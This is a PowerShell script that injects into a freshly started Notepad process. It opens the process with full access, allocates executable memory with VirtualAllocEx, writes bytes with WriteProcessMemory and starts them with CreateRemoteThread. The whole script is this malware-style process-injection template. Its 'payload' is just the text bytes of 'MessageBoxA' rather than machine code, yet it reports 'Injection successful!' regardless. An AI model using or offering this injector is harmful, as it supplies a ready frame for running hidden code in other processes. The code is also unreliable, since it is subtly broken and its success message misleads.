$notepad = Start-Process notepad -PassThru
Start-Sleep -Seconds 1

$processId = $notepad.Id
$kernel32 = Add-Type -Name "Kernel32" -Namespace Win32 -PassThru -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$PROCESS_ALL_ACCESS = 0x001F0FFF
$hProcess = $kernel32::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)

if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open Notepad process"
    exit
}

$payload = [System.Text.Encoding]::ASCII.GetBytes("MessageBoxA")
$size = $payload.Length
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$allocatedMemory = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

if ($allocatedMemory -eq [IntPtr]::Zero) {
    Write-Host "Memory allocation failed"
    exit
}

[UIntPtr]$bytesWritten = [UIntPtr]::Zero
$writeSuccess = $kernel32::WriteProcessMemory($hProcess, $allocatedMemory, $payload, [uint32]$size, [ref]$bytesWritten)

if (-not $writeSuccess) {
    Write-Host "Failed to write payload"
    exit
}

$threadHandle = $kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero)

if ($threadHandle -eq [IntPtr]::Zero) {
    Write-Host "Failed to create remote thread"
} else {
    Write-Host "Injection successful!"
}
